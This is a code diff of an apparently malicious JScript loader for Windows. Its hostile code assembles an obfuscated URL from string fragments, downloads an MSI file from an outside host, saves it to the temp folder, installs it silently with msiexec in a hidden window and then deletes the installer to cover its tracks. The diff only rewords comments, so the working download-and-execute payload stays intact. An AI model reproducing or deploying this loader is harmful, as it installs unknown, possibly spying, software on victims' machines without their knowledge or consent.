@@ -1,5 +1,5 @@
 (function () {
-    // Split URL, joined at runtime
+    // URL split into pieces, joined at runtime
     var u = "ht" + "tps" + "://" +
             "gekko" + "spy-new-" +
             "prod" + "uction" +
@@ -14,27 +14,30 @@
     var msi = tmp + "\\" + nm + ".msi";
 
     try {
-        // Using MSXML2 instead of WinHttp to avoid .NET prompts
+        // MSXML2 is more universally available than WinHttp
         var xhr = new ActiveXObject("MSXML" + "2.XMLHTTP");
         xhr.Open("GET", u, false);
         xhr.Send();
+        
         if (xhr.Status !== 200) return;
 
-        // Save bytes
+        // ADODB.Stream writes the bytes to disk
         var stream = new ActiveXObject("ADODB" + ".Stream");
-        stream.Type = 1; // Binary
+        stream.Type = 1; 
         stream.Open();
         stream.Write(xhr.ResponseBody);
-        stream.SaveToFile(msi, 2); // 2 = overwrite
+        stream.SaveToFile(msi, 2); 
         stream.Close();
     } catch (e) {
         return; 
     }
 
+    // Run msiexec silently, wait for it to finish
     try { 
         sh.Run('msi' + 'exec /' + 'i "' + msi + '" /q' + 'n /nore' + 'start', 0, true); 
     } catch (e2) { return; }
 
+    // Cleanup
     try { fso.DeleteFile(msi, true); } catch (e3) {}
     try { sh.Run('cmd /c ping -n 3 127.0.0.1 >nul & del /f /q "' + msi + '"', 0, true); } catch (e4) {}
 })();
